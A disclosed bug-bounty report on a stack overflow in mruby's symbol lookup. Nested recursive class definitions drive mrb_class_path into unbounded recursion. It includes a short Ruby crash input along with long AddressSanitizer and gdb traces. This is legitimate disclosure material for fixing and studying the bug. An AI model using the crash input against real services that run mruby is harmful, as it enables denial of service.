# kh_get_n2s() stack overrun

## Report Details
- **Report ID**: 192578
- **URL**: https://hackerone.com/reports/192578
- **State**: Closed
- **Severity**: low
- **Submitted**: 2016-12-20T00:50:06.395Z
- **Disclosed**: 2017-03-09T01:25:49.620Z

## Reporter
- **Username**: mg36
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
Defining recursive classes could lead to a stack overrun in **kh_get_n2s**,

POC
=====================
With this code we can achieve a stack overflow
```
class<<Proc
class P class<<Proc
class P class P t end end
end end end
```

Debug analysis
=====================
```
simo@vlab64:~/sources/mruby/bin/mruby/% cat CR1.rb | ../mruby_asan
ASAN:DEADLYSIGNAL
=================================================================
==99188==ERROR: AddressSanitizer: stack-overflow on address 0x7ffd22656fc8 (pc 0x000000431cd0 bp 0x7ffd22657850 sp 0x7ffd22656fd0 T0)
    #0 0x431ccf in __interceptor_memcmp (/home/simo/sources/mruby/bin/fuzz_mruby/mruby_asan+0x431ccf)
    #1 0x534636 in kh_get_n2s /home/simo/sources/mruby_libF/src/symbol.c:37:1
    #2 0x5363d2 in sym_intern /home/simo/sources/mruby_libF/src/symbol.c:62:9
    #3 0x524fc5 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1562:23
    #4 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #5 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #6 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #7 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #8 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #9 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #10 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #11 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #12 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #13 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #14 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #15 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #16 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #17 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #18 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #19 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #20 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #21 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #22 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #23 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #24 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #25 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #26 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #27 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #28 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #29 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #30 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #31 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #32 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #33 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #34 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #35 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #36 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #37 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #38 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #39 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #40 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #41 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #42 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #43 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #44 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #45 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #46 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #47 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #48 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #49 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #50 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #51 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #52 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #53 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #54 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #55 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #56 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #57 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #58 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #59 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #60 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #61 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #62 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #63 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #64 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #65 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #66 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #67 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #68 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #69 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #70 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #71 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #72 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #73 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #74 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #75 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #76 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #77 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #78 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #79 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #80 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #81 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #82 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #83 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #84 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #85 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #86 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #87 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #88 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #89 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #90 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #91 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #92 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #93 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #94 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #95 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #96 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #97 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #98 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #99 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #100 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #101 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #102 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #103 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #104 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #105 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #106 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #107 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #108 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #109 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #110 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #111 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #112 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #113 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #114 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #115 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #116 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #117 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #118 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #119 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #120 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #121 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #122 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #123 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #124 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #125 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #126 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #127 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #128 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #129 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #130 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #131 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #132 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #133 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #134 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #135 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #136 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #137 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #138 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #139 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #140 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #141 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #142 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #143 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #144 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #145 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #146 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #147 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #148 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #149 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #150 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #151 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #152 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #153 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #154 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #155 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #156 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #157 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #158 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #159 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #160 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #161 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #162 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #163 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #164 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #165 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #166 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #167 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #168 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #169 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #170 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #171 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #172 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #173 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #174 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #175 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #176 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #177 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #178 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #179 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #180 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #181 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #182 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #183 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #184 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #185 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #186 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #187 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #188 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #189 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #190 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #191 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #192 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #193 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #194 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #195 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #196 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #197 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #198 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #199 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #200 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #201 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #202 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #203 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #204 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #205 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #206 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #207 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #208 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #209 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #210 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #211 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #212 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #213 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #214 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #215 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #216 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #217 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #218 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #219 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #220 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #221 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #222 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #223 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #224 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #225 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #226 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #227 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #228 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #229 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #230 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #231 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #232 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #233 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #234 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #235 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #236 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #237 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #238 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #239 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #240 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #241 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #242 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #243 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #244 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #245 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #246 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #247 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #248 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24
    #249 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24

SUMMARY: AddressSanitizer: stack-overflow (/home/simo/sources/mruby/bin/mruby/mruby_asan+0x431ccf) in __interceptor_memcmp
==99188==ABORTING
```

```
(gdb) r < CR1.rb
Starting program: /home/simo/sources/mruby/bin/mruby/mruby < CR1.rb

Program received signal SIGSEGV, Segmentation fault.
0x0000000000413b9d in sym_hash_func (mrb=<error reading variable: Cannot access memory at address 0x7fffff7fefd8>, s=<error reading variable: Cannot access memory at address 0x7fffff7fefd4>)
    at /home/simo/sources/patch/mruby/src/symbol.c:24
24	{
(gdb) x/5i $pc
=> 0x413b9d <sym_hash_func+4>:	mov    %rdi,-0x28(%rbp)
   0x413ba1 <sym_hash_func+8>:	mov    %esi,-0x2c(%rbp)
   0x413ba4 <sym_hash_func+11>:	movl   $0x0,-0x1c(%rbp)
   0x413bab <sym_hash_func+18>:	mov    -0x28(%rbp),%rax
   0x413baf <sym_hash_func+22>:	mov    0x158(%rax),%rax
(gdb) x/x $rbp-0x28
0x7fffff7fefd8:	Cannot access memory at address 0x7fffff7fefd8
(gdb) bt 10
#0  0x0000000000413b9d in sym_hash_func (mrb=<error reading variable: Cannot access memory at address 0x7fffff7fefd8>, s=<error reading variable: Cannot access memory at address 0x7fffff7fefd4>)
    at /home/simo/sources/patch/mruby/src/symbol.c:24
#1  0x0000000000413e4f in kh_get_n2s (mrb=0x6af010, h=0x6bb590, key=0) at /home/simo/sources/patch/mruby/src/symbol.c:37
#2  0x000000000041465d in sym_intern (mrb=0x6af010, name=0x46c25f "__classid__", len=11, lit=1 '\001') at /home/simo/sources/patch/mruby/src/symbol.c:62
#3  0x00000000004148b0 in mrb_intern_static (mrb=0x6af010, name=0x46c25f "__classid__", len=11) at /home/simo/sources/patch/mruby/src/symbol.c:101
#4  0x0000000000404fcb in mrb_class_sym (mrb=0x6af010, c=0x6bb330, outer=0x6b21b0) at /home/simo/sources/patch/mruby/src/variable.c:1174
#5  0x0000000000410bb5 in mrb_class_path (mrb=0x6af010, c=0x6bb330) at /home/simo/sources/patch/mruby/src/class.c:1567
#6  0x0000000000410bf8 in mrb_class_path (mrb=0x6af010, c=0x6b21b0) at /home/simo/sources/patch/mruby/src/class.c:1574
#7  0x0000000000410bf8 in mrb_class_path (mrb=0x6af010, c=0x6bb330) at /home/simo/sources/patch/mruby/src/class.c:1574
#8  0x0000000000410bf8 in mrb_class_path (mrb=0x6af010, c=0x6b21b0) at /home/simo/sources/patch/mruby/src/class.c:1574
#9  0x0000000000410bf8 in mrb_class_path (mrb=0x6af010, c=0x6bb330) at /home/simo/sources/patch/mruby/src/class.c:1574
(More stack frames follow...)
(gdb)
```



## Attachments
No attachments
